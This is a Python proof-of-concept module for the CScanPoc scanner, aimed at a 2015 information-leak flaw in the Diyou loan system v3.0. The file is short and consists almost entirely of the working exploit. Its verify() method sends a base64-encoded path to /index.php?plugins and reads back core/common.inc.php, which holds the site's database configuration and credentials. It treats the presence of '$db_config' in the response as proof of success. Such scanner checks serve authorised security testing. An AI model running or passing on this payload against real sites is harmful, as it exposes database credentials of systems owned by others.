# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Diyou_0101' # 平台漏洞编号，留空
    name = '帝友借贷系统 v3.0 /index.php?plugins 信息泄露' # 漏洞名称
    level = VulnLevel.MED # 漏洞危害级别
    type = VulnType.INFO_LEAK # 漏洞类型
    disclosure_date = '2015-03-09'  # 漏洞公布时间
    desc = '''
    帝友借贷系统 v3.0 /index.php?plugins 信息泄露漏洞。
    漏洞文件：/index.php
    ''' # 漏洞描述
    ref = 'Unknown' # 漏洞来源http://wooyun.org/bugs/wooyun-2010-033114
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Diyou(帝友借贷系统)'  # 漏洞应用名称
    product_version = '3.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '776d36d3-dfbf-4352-9b02-2de1131d409a' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = '/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA=='
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if 'common.inc.php' in content and '$db_config' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()